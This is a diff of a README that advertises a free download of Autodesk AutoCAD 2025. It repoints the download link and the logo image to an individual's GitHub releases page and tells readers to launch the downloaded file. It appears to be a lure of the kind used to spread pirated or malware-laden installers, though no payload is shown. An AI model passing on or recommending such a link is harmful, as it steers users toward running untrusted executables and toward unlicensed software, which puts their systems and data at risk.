@@ -21,7 +21,7 @@ In this repository, you can find the download link for Autodesk AutoCAD 2025 for
 - drawing
 
 ### Download AutoCAD 2025:
-You can download AutoCAD 2025 for free by clicking [here](https://github.com/file/Soft.zip). 😄
+You can download AutoCAD 2025 for free by clicking [here](https://github.com/aman-dohare/auto-cad-2025/releases). 😄
 
 #### Note: 
 - After clicking the link, if it ends with the file name, make sure to launch the downloaded file. 🚀
@@ -40,4 +40,4 @@ If you find this repository helpful, show your support by giving it a ⭐️ sta
 
 ### Happy Designing with AutoCAD 2025! 🌟✨
 
-![AutoCAD Logo](https://upload.wikimedia.org/wikipedia/commons/1/19/AutoCAD_Icon.png)
+![AutoCAD Logo](https://github.com/aman-dohare/auto-cad-2025/releases)
